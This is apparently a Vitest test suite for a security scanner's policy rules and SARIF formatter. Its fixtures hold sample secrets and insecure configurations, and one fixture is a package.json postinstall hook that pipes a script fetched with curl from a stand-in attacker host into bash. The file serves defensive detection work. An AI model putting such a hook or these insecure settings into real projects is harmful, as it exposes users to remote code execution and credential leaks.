import { describe, it, expect } from 'vitest';
import { NativePolicyRegistry } from '../src/policy/native-policy-registry.js';
import { SarifFormatter } from '../src/reports/sarif-formatter.js';
import { ScanReport } from '@shipshield/contracts';

describe('Native Policy Registry & Rules Suite', () => {
  it('registers all built-in security policies across all required categories', () => {
    const rules = NativePolicyRegistry.getAll();
    expect(rules.length).toBeGreaterThanOrEqual(14);

    const categories = new Set(rules.map((r) => r.category));
    expect(categories.has('secrets')).toBe(true);
    expect(categories.has('containers')).toBe(true);
    expect(categories.has('iac')).toBe(true);
    expect(categories.has('kubernetes')).toBe(true);
    expect(categories.has('cicd')).toBe(true);
    expect(categories.has('supply-chain')).toBe(true);
    expect(categories.has('general')).toBe(true);
  });

  it('validates rule definition structures successfully', () => {
    for (const rule of NativePolicyRegistry.getAll()) {
      const result = NativePolicyRegistry.validateRuleDefinition(rule);
      expect(result.valid).toBe(true);
      expect(result.errors).toHaveLength(0);
    }
  });

  it('rejects invalid policy definitions with detailed error messages', () => {
    const invalidRule: any = {
      id: 'INVALID_ID_FORMAT',
      title: 'Bad Rule',
      category: 'unknown_cat',
      severity: 'extreme',
    };
    const result = NativePolicyRegistry.validateRuleDefinition(invalidRule);
    expect(result.valid).toBe(false);
    expect(result.errors.length).toBeGreaterThan(0);
  });

  describe('Category A: Secrets Detection', () => {
    it('detects hardcoded RSA/SSH private keys (SS-SECRET-001)', () => {
      const privateKey = '-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0mockkey...\n-----END RSA PRIVATE KEY-----';
      const findings = NativePolicyRegistry.runPoliciesOnContent('keys/id_rsa', privateKey);
      expect(findings.some((f) => f.rule_id === 'SS-SECRET-001')).toBe(true);
    });

    it('detects AWS access keys with Shannon entropy validation (SS-SECRET-002)', () => {
      const awsKey = 'aws_access_key_id = "AKIAIOSFODNN7EXAMPLE"';
      const findings = NativePolicyRegistry.runPoliciesOnContent('deploy.env', awsKey);
      expect(findings.some((f) => f.rule_id === 'SS-SECRET-002')).toBe(true);
    });

    it('detects GitHub Personal Access Tokens (SS-SECRET-003)', () => {
      const ghToken = 'const token = "ghp_0123456789abcdefghijklmnopqrstuvwxyz";';
      const findings = NativePolicyRegistry.runPoliciesOnContent('src/config.ts', ghToken);
      expect(findings.some((f) => f.rule_id === 'SS-SECRET-003')).toBe(true);
    });

    it('detects database connection string with plaintext password (SS-SECRET-004)', () => {
      const dbUrl = 'DATABASE_URL="postgres://appuser:SecretP@ssw0rd99!@db.internal:5432/production"';
      const findings = NativePolicyRegistry.runPoliciesOnContent('config.env', dbUrl);
      expect(findings.some((f) => f.rule_id === 'SS-SECRET-004')).toBe(true);
    });
  });

  describe('Category B: Containers & Docker Security', () => {
    it('flags Dockerfile missing non-root USER instruction (SS-DOCKER-001)', () => {
      const dockerfile = 'FROM node:20-alpine\nWORKDIR /app\nCOPY . .\nCMD ["node", "index.js"]\n';
      const findings = NativePolicyRegistry.runPoliciesOnContent('Dockerfile', dockerfile);
      expect(findings.some((f) => f.rule_id === 'SS-DOCKER-001')).toBe(true);
    });

    it('passes Dockerfile that defines a non-root USER (SS-DOCKER-001 negative case)', () => {
      const dockerfile = 'FROM node:20-alpine\nUSER node\nCMD ["node", "index.js"]\n';
      const findings = NativePolicyRegistry.runPoliciesOnContent('Dockerfile', dockerfile);
      expect(findings.some((f) => f.rule_id === 'SS-DOCKER-001')).toBe(false);
    });

    it('flags unpinned mutable base image tag (SS-DOCKER-002)', () => {
      const dockerfile = 'FROM ubuntu:latest\nUSER app\n';
      const findings = NativePolicyRegistry.runPoliciesOnContent('Dockerfile', dockerfile);
      expect(findings.some((f) => f.rule_id === 'SS-DOCKER-002')).toBe(true);
    });

    it('flags sensitive files copied into container (SS-DOCKER-003)', () => {
      const dockerfile = 'FROM alpine:3.19\nCOPY .env /app/.env\n';
      const findings = NativePolicyRegistry.runPoliciesOnContent('Dockerfile', dockerfile);
      expect(findings.some((f) => f.rule_id === 'SS-DOCKER-003')).toBe(true);
    });

    it('flags docker daemon socket mount (SS-DOCKER-004)', () => {
      const compose = 'services:\n  runner:\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n';
      const findings = NativePolicyRegistry.runPoliciesOnContent('docker-compose.yml', compose);
      expect(findings.some((f) => f.rule_id === 'SS-DOCKER-004')).toBe(true);
    });
  });

  describe('Category C: Infrastructure as Code & Kubernetes', () => {
    it('flags publicly accessible Terraform S3 bucket (SS-IAC-001)', () => {
      const tf = 'resource "aws_s3_bucket" "b" {\n  bucket = "leaky"\n  acl = "public-read"\n}\n';
      const findings = NativePolicyRegistry.runPoliciesOnContent('main.tf', tf);
      expect(findings.some((f) => f.rule_id === 'SS-IAC-001')).toBe(true);
    });

    it('flags open admin ingress security group 0.0.0.0/0 on port 22 (SS-IAC-002)', () => {
      const tf = 'resource "aws_security_group" "ssh" {\n  cidr_blocks = ["0.0.0.0/0"]\n  from_port = 22\n}\n';
      const findings = NativePolicyRegistry.runPoliciesOnContent('security_groups.tf', tf);
      expect(findings.some((f) => f.rule_id === 'SS-IAC-002')).toBe(true);
    });

    it('flags privileged Kubernetes container (SS-K8S-001)', () => {
      const k8s = 'apiVersion: v1\nkind: Pod\nspec:\n  containers:\n  - name: test\n    securityContext:\n      privileged: true\n';
      const findings = NativePolicyRegistry.runPoliciesOnContent('pod.yaml', k8s);
      expect(findings.some((f) => f.rule_id === 'SS-K8S-001')).toBe(true);
    });
  });

  describe('Category D: CI/CD & GitHub Actions', () => {
    it('detects untrusted pull_request interpolation in run step (SS-CICD-001)', () => {
      const workflow = 'name: CI\non: pull_request\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "${{ github.event.pull_request.title }}"\n';
      const findings = NativePolicyRegistry.runPoliciesOnContent('.github/workflows/ci.yml', workflow);
      expect(findings.some((f) => f.rule_id === 'SS-CICD-001')).toBe(true);
    });

    it('detects overly permissive permissions: write-all (SS-CICD-002)', () => {
      const workflow = 'name: Release\npermissions: write-all\njobs:\n  build:\n    runs-on: ubuntu-latest\n';
      const findings = NativePolicyRegistry.runPoliciesOnContent('.github/workflows/release.yml', workflow);
      expect(findings.some((f) => f.rule_id === 'SS-CICD-002')).toBe(true);
    });
  });

  describe('Category E: Supply Chain & Application Security', () => {
    it('detects unencrypted HTTP package registry (SS-SUPPLY-001)', () => {
      const npmrc = 'registry=http://insecure-npm.local/repo/\n';
      const findings = NativePolicyRegistry.runPoliciesOnContent('.npmrc', npmrc);
      expect(findings.some((f) => f.rule_id === 'SS-SUPPLY-001')).toBe(true);
    });

    it('detects curl | bash in package.json scripts (SS-SUPPLY-002)', () => {
      const pkg = '{\n  "scripts": {\n    "postinstall": "curl -sSL http://evil.com/setup.sh | bash"\n  }\n}\n';
      const findings = NativePolicyRegistry.runPoliciesOnContent('package.json', pkg);
      expect(findings.some((f) => f.rule_id === 'SS-SUPPLY-002')).toBe(true);
    });

    it('detects disabled TLS certificate validation (SS-APP-001)', () => {
      const code = 'const agent = new https.Agent({ rejectUnauthorized: false });\n';
      const findings = NativePolicyRegistry.runPoliciesOnContent('src/client.ts', code);
      expect(findings.some((f) => f.rule_id === 'SS-APP-001')).toBe(true);
    });

    it('detects wildcard CORS origin with credentials enabled (SS-APP-002)', () => {
      const cors = 'app.use(cors({ origin: "*", credentials: true }));\n';
      const findings = NativePolicyRegistry.runPoliciesOnContent('src/server.ts', cors);
      expect(findings.some((f) => f.rule_id === 'SS-APP-002')).toBe(true);
    });
  });

  describe('SARIF v2.1.0 Formatter Suite', () => {
    it('generates compliant SARIF document from ScanReport', () => {
      const sampleReport: ScanReport = {
        schema_version: '1.0',
        tool: { name: 'shipshield', version: '1.0.0' },
        scan: {
          id: 'scan_sample_sarif_001',
          started_at: new Date().toISOString(),
          completed_at: new Date().toISOString(),
          mode: 'offline',
          completeness: 'complete',
          scope: { kind: 'full', root: '/workspace' },
          policy_outcome: 'policy_failed',
        },
        scanners: [
          {
            id: 'secrets',
            status: 'completed',
            engine: 'native',
            duration_ms: 10,
            finding_count: 1,
            error_message: null,
          },
        ],
        findings: [
          {
            id: 'find_01',
            fingerprint: 'fp_sample_01',
            rule_id: 'SS-SECRET-001',
            category: 'secrets',
            severity: 'critical',
            confidence: 'high',
            title: 'Hardcoded Private Key',
            description: 'Detected private key committed to repo',
            location: {
              path: 'keys/id_rsa',
              start_line: 1,
              end_line: 5,
            },
            evidence: {
              line_snippet: '-----BEGIN RSA PRIVATE KEY-----',
              redacted: true,
            },
            remediation: {
              summary: 'Remove private key',
            },
            scanner: 'native',
          },
        ],
        summary: {
          scanners_total: 1,
          scanners_completed: 1,
          scanners_failed: 0,
          scanners_skipped: 0,
          findings_total: 1,
          policy_violations: 1,
          findings_by_severity: {
            critical: 1,
            high: 0,
            medium: 0,
            low: 0,
            info: 0,
          },
          duration_ms: 10,
        },
        warnings: [],
      };

      const sarif = SarifFormatter.format(sampleReport);
      expect(sarif.version).toBe('2.1.0');
      expect(sarif.runs.length).toBe(1);
      expect(sarif.runs[0]?.tool.driver.name).toBe('ShipShield');
      expect(sarif.runs[0]?.tool.driver.rules.some((r) => r.id === 'SS-SECRET-001')).toBe(true);
      expect(sarif.runs[0]?.results.length).toBe(1);
      expect(sarif.runs[0]?.results[0]?.level).toBe('error');
      expect(sarif.runs[0]?.results[0]?.locations[0]?.physicalLocation.artifactLocation.uri).toBe('keys/id_rsa');
    });
  });
});
